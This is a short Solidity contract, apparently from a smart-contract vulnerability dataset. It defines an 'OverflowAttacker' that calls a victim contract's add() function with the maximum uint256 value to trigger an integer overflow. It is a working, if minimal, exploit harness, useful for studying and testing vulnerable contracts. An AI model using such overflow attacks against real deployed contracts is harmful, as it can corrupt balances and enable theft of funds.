pragma solidity ^0.4.19;

import "../dataset/arithmetic/integer_overflow_1.sol";

contract OverflowAttacker {
    Overflow public victim_contract;

    constructor(address _overflowAddress) public {
        victim_contract = Overflow(_overflowAddress);
    }

    function addMax() public {
        uint256 maxUint = 2 ** 256 - 1;

        victim_contract.add(maxUint);
    }
}
